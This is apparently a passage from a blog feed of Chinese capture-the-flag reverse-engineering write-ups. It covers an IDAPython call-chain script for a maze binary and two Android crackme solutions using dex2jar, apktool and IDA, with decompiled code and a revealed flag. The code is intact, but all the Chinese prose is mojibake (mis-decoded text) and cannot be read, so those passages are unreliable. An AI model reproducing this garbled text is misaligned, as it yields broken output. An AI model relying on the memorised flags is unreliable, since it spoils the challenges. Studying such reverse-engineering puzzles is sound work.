class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (addr_ref_to != BADADDR) <span class="keyword">and</span> (addr_ref_to != addr):</span><br><span class="line">        parent_func_name = get_func_name(addr_ref_to)</span><br><span class="line">        callee_list = get_my_callee(parent_func_name)</span><br><span class="line">        ids = callee_list.index(func_name)</span><br><span class="line"><span class="comment">#print (callee_list,func_name,cur_id,end = &quot;,&quot;)</span></span><br><span class="line">        steps.append(idx2chr[ids])</span><br><span class="line">        get_my_caller(parent_func_name, osintneting - <span class="number">1</span>,destination)</span><br><span class="line">        steps.pop()</span><br><span class="line">        addr_ref_to = get_next_fcref_to(addr, addr_ref_to)</span><br><span class="line">        <span class="keyword">if</span> addr_ref_to == BADADDR:</span><br><span class="line">            r_call_chain.pop()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_my_callee</span>(<span class="params">func_name</span>):</span></span><br><span class="line">    addr = get_name_ea(<span class="number">0</span>, func_name)</span><br><span class="line">    dism_addr = <span class="built_in">list</span>(idautils.FuncItems(addr))</span><br><span class="line">    xref_froms = []</span><br><span class="line">    <span class="keyword">for</span> ea <span class="keyword">in</span> dism_addr:</span><br><span class="line">        <span class="keyword">if</span> ida_idp.is_call_insn(ea) <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            callee = get_first_fcref_from(ea)</span><br><span class="line">            <span class="keyword">if</span> callee != addr:</span><br><span class="line">                xref_froms.append(callee)</span><br><span class="line">    names = [get_func_name(callee) <span class="keyword">for</span> callee <span class="keyword">in</span> xref_froms]</span><br><span class="line">    <span class="keyword">return</span> names</span><br><span class="line">gen_r_call_chain(<span class="string">&#x27;sub_54DE35&#x27;</span>, <span class="number">600</span>, <span class="string">&#x27;sub_40187C&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>idx2chr = &#123;4: &#39;W&#39;,5: &#39;D&#39;,6: &#39;S&#39;,7: &#39;A&#39;&#125;</code> çš„åŸå› æ˜¯ä»æ±‡ç¼–æ¥çœ‹</p><p>callee_list , func_name , cur_id</p><p>[â€˜sub_55D500â€™, â€˜sub_597460â€™, â€˜sub_55F1F0â€™, â€˜sub_597460â€™, â€˜sub_4EB7E3â€™, â€˜sub_4ED806â€™, â€˜sub_4F11F5â€™, â€˜sub_55D500â€™, â€˜sub_55BD20â€™] </p><p>sub_4F11F5 </p><p>6</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210803082306.png" alt="image-20210803082306420"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">void sub_4ED753()</span><br><span class="line">&#123;</span><br><span class="line">  char v0; // [rsp+Fh] [rbp-1h]</span><br><span class="line"></span><br><span class="line">  sub_55D500((__int64)&quot;Just do it&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_597460(0LL);</span><br><span class="line">    v0 = sub_55F1F0();</span><br><span class="line">    sub_597460(0LL);</span><br><span class="line">    switch ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      case &#x27;A&#x27;:</span><br><span class="line">        goto LABEL_6;</span><br><span class="line">      case &#x27;D&#x27;:</span><br><span class="line">        goto LABEL_4;</span><br><span class="line">      case &#x27;Q&#x27;:</span><br><span class="line">        sub_55BD20(0);</span><br><span class="line">      case &#x27;S&#x27;:</span><br><span class="line">        goto LABEL_5;</span><br><span class="line">      case &#x27;W&#x27;:</span><br><span class="line">        sub_4EB7E3(0LL, 0LL);</span><br><span class="line">LABEL_4:</span><br><span class="line">        sub_4ED806(0LL, 0LL);</span><br><span class="line">LABEL_5:</span><br><span class="line">        sub_4F11F5(0LL, 0LL);</span><br><span class="line">LABEL_6:</span><br><span class="line">        sub_55D500((__int64)&quot;OUCH!!!!&quot;);</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        continue;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹åº”çš„å°±æ˜¯4: â€˜Wâ€™,5: â€˜Dâ€™,6: â€˜Sâ€™,7: â€˜Aâ€™</p><p>è¿è¡Œè„šæœ¬åï¼Œç¬¬ä¸€ä¸ªæœ€çŸ­è€Œä¸”åˆ°è¾¾äº†ç»ˆç‚¹</p><p>ç”±äºå¼€å§‹çš„æ—¶å€™éœ€è¦â€œSâ€ä¸€ä¸‹è¿›å…¥åœ°å›¾ï¼Œæ‰€ä»¥åœ¨åŠ ä¸Šä¸€ä¸ªSï¼Œmd5åå¾—åˆ°flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">sub_40180E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  sub_55D500((__int64)<span class="string">&quot;This is the beginning. You can only go south.&quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_597460(<span class="number">0LL</span>);</span><br><span class="line">    v0 = sub_55F1F0();</span><br><span class="line">    sub_597460(<span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v0 == <span class="string">&#x27;Q&#x27;</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v0 != <span class="string">&#x27;S&#x27;</span> );</span><br><span class="line">  sub_40187C();</span><br><span class="line">LABEL_5:</span><br><span class="line">  sub_55BD20(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210802112122.png" alt="image-20210802112122575"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å·…å³°æå®¢reverse-baby-maze&quot;&gt;&lt;a href=&quot;#å·…å³°æå®¢reverse-baby-maze&quot; class=&quot;headerlink&quot; title=&quot;å·…å³°æå®¢reverse baby_maze&quot;&gt;&lt;/a&gt;å·…å³°æå®¢reverse baby_maze&lt;/</summary>
      
    
    
    
    <category term="reverse ctf" scheme="http://example.com/categories/reverse-ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>å®‰å“é€†å‘æ€è·¯</title>
    <link href="http://example.com/2021/08/13/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E6%80%9D%E8%B7%AF/"/>
    <id>http://example.com/2021/08/13/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E6%80%9D%E8%B7%AF/</id>
    <published>2021-08-13T11:39:43.653Z</published>
    <updated>2021-08-13T07:47:56.676Z</updated>
    
    <content type="html"><![CDATA[<h1 id="easyeasy-200"><a href="#easyeasy-200" class="headerlink" title="easyeasy-200"></a>easyeasy-200</h1><p>å®‰å“é€†å‘</p><p>ç”¨Android Killerç›´æ¥åæ±‡ç¼–ï¼Œæ¥ç€çœ‹ç¨‹åºjavaå±‚</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151058.png" alt="image-20210114105441455"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ApplicationInfoæ˜¯android.content.pmåŒ…ä¸‹çš„ä¸€ä¸ªå®ä½“ç±»ï¼Œç”¨äºå°è£…åº”ç”¨çš„ä¿¡æ¯ï¼Œflagsæ˜¯å…¶ä¸­çš„ä¸€ä¸ªæˆå‘˜å˜é‡public int flags = 0;ç”¨äºä¿å­˜åº”ç”¨çš„æ ‡å¿—ä¿¡æ¯ã€‚</span><br><span class="line">ApplicationInfo é€šè¿‡å®ƒå¯ä»¥å¾—åˆ°ä¸€ä¸ªåº”ç”¨åŸºæœ¬ä¿¡æ¯ã€‚è¿™äº›ä¿¡æ¯æ˜¯ä»AndroidManifest.xmlçš„&lt; application &gt;æ ‡ç­¾è·å–çš„</span><br><span class="line">ApplicationInfoå¯¹è±¡é‡Œä¿å­˜çš„ä¿¡æ¯éƒ½æ˜¯&lt;application&gt;æ ‡ç­¾é‡Œçš„å±æ€§å€¼</span><br></pre></td></tr></table></figure><p>è¿™äº›ä¿¡æ¯æ²¡ç”¨</p><p>æ¥ç€çœ‹ä¸‹é¢çš„åˆ¤æ–­</p><p>å‘ç°è¦æ±‚è¾“å…¥çš„å­—ç¬¦ä¸²çš„é•¿åº¦è¦åœ¨35-39ä¹‹é—´ï¼Œä¹‹åå†è°ƒç”¨Format().formå‡½æ•°</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151555.png" alt="image-20210112120154118"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paramString.substringæ˜¯ç”¨æ¥æˆªå–å­—ç¬¦ä¸²çš„</span><br></pre></td></tr></table></figure><p>è°ƒç”¨Format().form æ‰€ä»¥è¿”å›çš„æ˜¯å­—ç¬¦ä¸²çš„[5,38]ï¼Œå› æ­¤å­—ç¬¦ä¸²é•¿åº¦éœ€è¦å¤§äº38</p><p>æ¥ç€çœ‹ä¸»å‡½æ•°å¾—çŸ¥è¿”å›çš„å­—ç¬¦ä¸²éœ€è¦å¤§äº32ï¼Œæ»¡è¶³å°±æ˜¯è°ƒç”¨Checkæ¨¡å—ä¸­çš„check</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151541.png" alt="image-20210112124934291"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exists()æ–¹æ³•</span><br><span class="line">è¿”å›å€¼ï¼š</span><br><span class="line">trueï¼šæ­¤æŠ½è±¡è·¯å¾„åè¡¨ç¤ºçš„æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨</span><br><span class="line">falseï¼šå…¶ä»–</span><br></pre></td></tr></table></figure><p>Checkæ¨¡å—ä¸­å…ˆæ˜¯å¤åˆ¶äº†ä¸¤ä¸ªè·¯å¾„ï¼Œå†è°ƒç”¨äº†checkPipesï¼Œåˆ¤æ–­è·¯å¾„æ˜¯å¦å­˜åœ¨ï¼Œä¸¤ä¸ªè·¯å¾„ä¸­å­˜åœ¨ä»»ä½•ä¸€ä¸ªå°±ä¼šè¢«èµ‹å€¼ä¸ºtureå¹¶è¿”å›ã€‚å½“ä¸¤ä¸ªè·¯å¾„éƒ½ä¸å­˜åœ¨æ—¶èµ‹å€¼ä¸ºfalseã€‚</p><p>checkå‡½æ•°å…ˆå°†emulatorä¼ å…¥ï¼Œåˆ¤æ–­å…¶ç»“æœï¼Œç»“æœä¸ºçœŸè¿”å›falseï¼Œå¦åˆ™å°±è°ƒç”¨åé¢çš„checkPasswdä¼ å…¥paramString</p><p>å…³é”®å°±åœ¨è¿™ä¸ªcheckPasswdä¸­</p><p>ç°åœ¨éœ€è¦å°†apkç¼–è¯‘åå†ç”¨idaè°ƒè¯•soæ–‡ä»¶ï¼ˆå†çœ‹çœ‹nativeå±‚ï¼‰</p><p>ï¼ˆè¦ç”¨apktoolåç¼–è¯‘ï¼Œsoåœ¨ç”Ÿæˆçš„æ–‡ä»¶å¤¹/lib/é€‰æ‹©ä½ çš„IDAå¯¹åº”ç‰ˆæœ¬æ–‡ä»¶çš„soæ‰“å¼€ï¼Œæˆ‘æ˜¯android Killerä¸€é”®å°±æœ‰äº†ï¼‰</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151609.png" alt="image-20210114112911512"></p><p>ç”¨idaæ‰“å¼€</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151807.png" alt="image-20210114113426218"></p><p>å¯ä»¥çœ‹å‡ºå…ˆv7å…ˆæ˜¯ç”³è¯·ç©ºé—´ï¼Œå†å­˜ç€V6é‡Œçš„å­—ç¬¦ä¸²ï¼Œä¹‹åè¿›è¡Œäº†å­—ç¬¦ä¸²çš„åè½¬</p><p>æ¥ç€è¿›å…¥sub_6ED0(&amp;v15, v7, v11);</p><p>é€šè¿‡</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151756.png" alt="image-20210114114621993"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153337.png" alt="image-20210114114701627"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151751.png" alt="image-20210114114647093"></p><p>å¯ä»¥æ¨æ–­å‡ºè¿™åº”è¯¥æ˜¯å°†å­—ç¬¦ä¸²å¤åˆ¶ç»™v15</p><p>ä¹‹åå°±æ˜¯ encrypt((const char *)&amp;v14, v15); è¿™ä¸€åŠ å¯†äº†</p><p>ç„¶åå°†åŠ å¯†åçš„å­—ç¬¦ç»™äº† v12 </p><p>sub_69A4(&amp;v14);<br>sub_69A4(&amp;v15);</p><p>é‡Œé¢è¿›è¡Œäº†deleteï¼Œé‡Šæ”¾ç©ºé—´</p><p>æ¥ç€æ˜¯sub_7834((int)&amp;secret, v12)</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151832.png" alt="image-20210114115215409"></p><p>è¿™é‡Œæ˜¯æ¯”è¾ƒäº†ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸åŒ</p><p>é‚£ç°åœ¨å°±æ˜¯æ‰¾secretçš„å€¼ï¼Œé€šè¿‡æŒ‰Xï¼Œæ‰¾ä½¿ç”¨è¿‡ä»–çš„å‡½æ•°</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151923.png" alt="image-20210114115434319"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151929.png" alt="image-20210114115448907"></p><p>æ‰¾åˆ°äº†secretçš„å­—ç¬¦ä¸²ï¼Œå’Œdword_1D09Cçš„å­—ç¬¦ä¸²ï¼Œçœ‹ç€å°±åƒbase64</p><p>å†å›å¤´çœ‹çœ‹encrypté‚£ä¸ªå‡½æ•°</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152000.png" alt="image-20210114123401067"></p><p>å…ˆbase64è§£ç </p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152014.png" alt="image-20210114123444160"></p><p>å†åè½¬å°±å¯ä»¥åˆ°åˆ°ç­”æ¡ˆäº†</p><p>flag{iwantashellbecauseidonthaveitttt}</p><h1 id="easycrack-100"><a href="#easycrack-100" class="headerlink" title="easycrack-100"></a>easycrack-100</h1><p>é¢˜ç›®ç»™äº†æç¤ºï¼šåœ¨Javaå±‚æ²¡æœ‰å¤ªå¤šé€»è¾‘ï¼Œå¯¹è¾“å…¥æ¡†è¿›è¡Œç›‘å¬ï¼Œå½“æœ‰è¾“å…¥çš„æ—¶å€™è°ƒç”¨nativeå±‚çš„å‡½æ•°è¿›è¡Œæ ¡éªŒ</p><p>æŸ¥æŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Androidçš„åˆ†4å±‚ï¼Œjavaåº”ç”¨ç¨‹åºï¼Œjavaæ¡†æ¶ï¼Œæœ¬åœ°æ¡†æ¶å’Œjavaè¿è¡Œç¯å¢ƒï¼ŒLinuxå†…æ ¸ç©ºé—´</span><br><span class="line"></span><br><span class="line">Javaåº”ç”¨ç¨‹åºæ— éœ€è¿‡å¤šè§£é‡Šï¼ŒåŸºæœ¬å¯ä»¥ç†è§£ä¸ºå„ä¸ªAppï¼Œç”±Javaè¯­è¨€å®ç°ã€‚</span><br><span class="line">Javaæ¡†æ¶å±‚ï¼ˆç³»ç»ŸæœåŠ¡ï¼‰å°±æ˜¯å¸¸è¯´çš„Frameworkï¼Œè¿™å±‚é‡Œä¸œè¥¿å¾ˆå¤šä¹Ÿå¾ˆå¤æ‚ï¼Œæ¯”å¦‚è¯´ä¸»è¦çš„ä¸€äº›ç³»ç»ŸæœåŠ¡å¦‚ActivityManagerServiceã€PackageManagerServiceç­‰ï¼Œæˆ‘ä»¬ç¼–å†™çš„Androidä»£ç ä¹‹æ‰€ä»¥èƒ½å¤Ÿæ­£å¸¸è¯†åˆ«å’ŒåŠ¨ä½œï¼Œéƒ½è¦ä¾èµ–è¿™ä¸€å±‚çš„æ”¯æŒã€‚è¿™ä¸€å±‚ä¹Ÿæ˜¯ç”±Javaè¯­è¨€å®ç°ã€‚</span><br><span class="line">Nativeå±‚ï¼ˆæœ¬åœ°æœåŠ¡ï¼‰è¿™éƒ¨åˆ†å¸¸è§ä¸€äº›æœ¬åœ°æœåŠ¡å’Œä¸€äº›é“¾æ¥åº“ç­‰ã€‚è¿™ä¸€å±‚çš„ä¸€ä¸ªç‰¹ç‚¹å°±æ˜¯é€šè¿‡Cå’ŒC++è¯­è¨€å®ç°ã€‚æ¯”å¦‚æˆ‘ä»¬ç°åœ¨è¦æ‰§è¡Œä¸€ä¸ªå¤æ‚è¿ç®—ï¼Œå¦‚æœé€šè¿‡javaä»£ç å»å®ç°ï¼Œé‚£ä¹ˆæ•ˆç‡ä¼šéå¸¸ä½ï¼Œæ­¤æ—¶å¯ä»¥é€‰æ‹©é€šè¿‡Cæˆ–C++ä»£ç å»å®ç°ï¼Œç„¶åå’Œæˆ‘ä»¬ä¸Šå±‚çš„Javaä»£ç é€šä¿¡ï¼ˆè¿™éƒ¨åˆ†åœ¨androidä¸­ç§°ä¸ºjniæœºåˆ¶ï¼‰ã€‚åˆæ¯”å¦‚æˆ‘ä»¬çš„è®¾å¤‡éœ€è¦è¿è¡Œï¼Œé‚£ä¹ˆå¿…ç„¶è¦å’Œåº•å±‚çš„ç¡¬ä»¶é©±åŠ¨äº¤äº’ï¼Œä¹Ÿè¦é€šè¿‡Nativeå±‚ã€‚</span><br><span class="line">Linuxå†…æ ¸ç©ºé—´åŒ…æ‹¬äº†å†…å­˜ç®¡ç†ã€å®‰å…¨ã€ç½‘ç»œæ ˆã€è¿›ç¨‹ç®¡ç†å’Œé©±åŠ¨æ¨¡å—ç­‰ç­‰æ–¹é¢å†…å®¹</span><br></pre></td></tr></table></figure><p>åˆšåˆšé‚£é¢˜Checkæ¨¡å—çš„checkå°±æ˜¯ç”¨åˆ°äº†nativeå±‚å‡½æ•°</p><p>è¿™é¢˜æˆ‘ä»¬ä¸ç”¨Android killerï¼ŒåŸºæœ¬çš„æ“ä½œæ¥ä¸€æ¬¡</p><p>å…ˆå°†æ–‡ä»¶ç”¨zipè§£å‹</p><p>å°†classes.dexæ–‡ä»¶æ”¾åˆ°dex2jarå·¥å…·ä¸‹ï¼Œè¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d2j-dex2jar.bat  classes.dex</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152023.png" alt="image-20210114125747473"></p><p>ç”Ÿæˆäº†classes_dex2jar.jaræ–‡ä»¶</p><p>ç”¨jd-gui-1.6.6.jaræ‰“å¼€åˆ†æ</p><p>çœ‹åˆ°ä¸»å‡½æ•°</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152026.png" alt="image-20210114150645628"></p><p>System.loadLibraryè°ƒç”¨SOæºç </p><p>MessageMeæ–¹æ³•é¦–å…ˆè·å–ç¨‹åºåŒ…åç§°ï¼Œå…¶ä¸­å‡ºç°äº†ä¸€äº›æ–°çš„å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getPackageNameæ˜¯Androidä¸­Contextä¸­ç”¨äºå¾—åˆ°åŒ…åçš„å‡½æ•°</span><br><span class="line">é¢˜ç›®ä¸­ç”¨\\.éš”å¼€å¾—åˆ°åŒ…å</span><br><span class="line">ToCharArray( )çš„ç”¨æ³•ï¼Œå°†å­—ç¬¦ä¸²å¯¹è±¡ä¸­çš„å­—ç¬¦è½¬æ¢ä¸ºä¸€ä¸ªå­—ç¬¦æ•°ç»„ã€‚</span><br><span class="line">    ä¾‹å¦‚ï¼š</span><br><span class="line">    String myString=&quot;abcd&quot;;</span><br><span class="line">    char myChar[]=myString.toCharArray();</span><br><span class="line">    System.out.println(&quot;myChar[1]=&quot;+myChar[1]);</span><br><span class="line">    è¾“å‡ºç»“æœï¼šmyChar[1]=b</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>iä»51ï¼ˆâ€™3â€™ï¼‰å¼€å§‹ï¼Œå°†åŒ…åç»™äº†str</p><p>åˆåšäº†ä¸€äº›å¼‚æˆ–å¤„ç†ï¼Œä½†æ˜¯ç›®å‰çœ‹ä¸åˆ°localObjectå­—ç¬¦ä¸²ï¼Œå°±å…ˆæ”¾ç€</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152055.png" alt="image-20210114143041769"></p><p>è¿™æ˜¯å»ºç«‹æŒ‰é’®ã€æ–‡æœ¬ç•Œé¢ä¹‹ç±»çš„</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152133.png" alt="image-20210114143541229"></p><p>parseTextä¸ºnativeå±‚å‡½æ•°ï¼Œä¼ å…¥çš„å‚æ•°ä¸ºè¾“å…¥çš„å­—ç¬¦ä¸²ã€‚ç­‰ç­‰å¯ä»¥ç”¨idaåæ±‡ç¼–soçœ‹çœ‹</p><p>ä¸»è¦å°±æ˜¯è¿™ä¸ªç›‘å¬çª—å£</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152137.png" alt="image-20210114143131422"></p><p>å¦‚æœå­—ç¬¦ä¸²å˜åŠ¨ï¼Œå°†ä¼šæ‰§è¡Œå…·ä½“çš„å®ç°ï¼Œè¿™é‡Œæ˜¯è°ƒç”¨äº†nativeå±‚çš„parseTextå‡½æ•°ã€‚</p><p>ç°åœ¨åˆ©ç”¨apktoolåœ¨è¯¥ç›®å½•ä¸‹æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool.bat d [-s] -f xxx.apk -o appdebug</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152222.png" alt="image-20210114144843522"></p><p>ç›®å½•ä¸‹æ­¤æ—¶å¤šäº†ä¸€ä¸ªappdebugæ–‡ä»¶å¤¹ï¼Œé‡Œé¢å†…å®¹æ˜¯apkçš„xmlæ–‡ä»¶ã€AndroidManifest.xmlå’Œå›¾ç‰‡ç­‰</p><p>æˆ‘ä»¬æ‰¾åˆ°parseTextå‡½æ•°è¿›è¡Œåˆ†æ</p><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹å…³äºJNIçš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‡ºäºæ•ˆç‡çš„é—®é¢˜ï¼Œå¾ˆå¤šæƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ä¸Šå±‚çš„Javaä»£ç ä¸­è°ƒç”¨åº•å±‚ Cæˆ–C++å®ç°ï¼Œè¿™æ—¶jniå°±å¯ä»¥å¤§æ˜¾èº«æ‰‹äº†ã€‚jniï¼ˆJava Native Interfaceï¼‰å…è®¸Javaä»£ç å’Œå…¶ä»–è¯­è¨€å†™çš„ä»£ç è¿›è¡Œäº¤äº’ï¼Œä½¿ç”¨javaä¸æœ¬åœ°å·²ç¼–è¯‘çš„ä»£ç äº¤äº’ï¼Œé€šå¸¸ä¼šä¸§å¤±å¹³å°å¯ç§»æ¤æ€§ã€‚ä½†æ˜¯ï¼Œæœ‰äº›æƒ…å†µä¸‹è¿™æ · åšæ˜¯å¯ä»¥æ¥å—çš„ï¼Œç”šè‡³æ˜¯å¿…é¡»çš„ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ä¸€äº›æ—§çš„åº“ï¼Œä¸ç¡¬ä»¶ã€æ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’ï¼Œæˆ–è€…ä¸ºäº†æé«˜ç¨‹åºçš„æ€§èƒ½ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JNIEXPORT void JNICALL Java_com_example_jnitest_JniTest_hello  (JNIEnv *, jclass);</span><br></pre></td></tr></table></figure><p>JNIEnv *æ˜¯ä»»æ„ä¸€ä¸ªæœ¬åœ°æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152251.png" alt="image-20210114150133131"></p><p>å› æ­¤æˆ‘ä»¬å¯¹a1æŒ‰Yï¼Œæ”¹æˆJNIEnv *a1</p><p>æ¥ç€æ¥åˆ†æ</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152258.png" alt="image-20210114150951455"></p><p>æ‰¾åˆ°ç›¸åº”çš„åœ°å€äº†â€com/njctf/mobile/easycrackâ€ ï¼ŒåŒæ—¶å°†messageMeå‡½æ•°çš„è¿”å›å€¼å­˜åˆ°äº†v7</p><p>è¿”å›Javaå±‚ï¼ŒæŸ¥çœ‹messageMeå‡½æ•°ï¼Œå°†å…¶ç›´æ¥èµ‹å€¼javaåŒ…çš„åå­—ï¼Œç„¶åè¿è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">messageMe</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">String str = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">51</span>;</span><br><span class="line">String[] localObject = <span class="string">&quot;com/njctf/mobile/easycrack&quot;</span>.split(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">char</span>[] localObject1 = localObject[(localObject.length - <span class="number">1</span>)].toCharArray();</span><br><span class="line"><span class="keyword">int</span> k = localObject1.length;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++)</span><br><span class="line">&#123;</span><br><span class="line">  j ^= localObject1[i];</span><br><span class="line">  str = str + (<span class="keyword">char</span>)j;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(str);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å­—ç¬¦ä¸²â€V7D=^,M.Eâ€</p><p>åœ¨æ¥ç€çœ‹idaä¸­çš„åæ±‡ç¼–</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152351.png" alt="image-20210114152931367"></p><p>åˆå°†v7èµ‹å€¼ç»™v8ï¼Œv8èµ‹å€¼ç»™äº†v9ï¼Œå°†è¾“å…¥çš„å­—ç¬¦ä¸²å­˜åœ¨äº†v10</p><p>v11å­˜äº†è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œv12å­˜äº†å­—ç¬¦ä¸²â€V7D=^,M.Eâ€çš„é•¿åº¦ï¼ˆ9ï¼‰</p><p><img 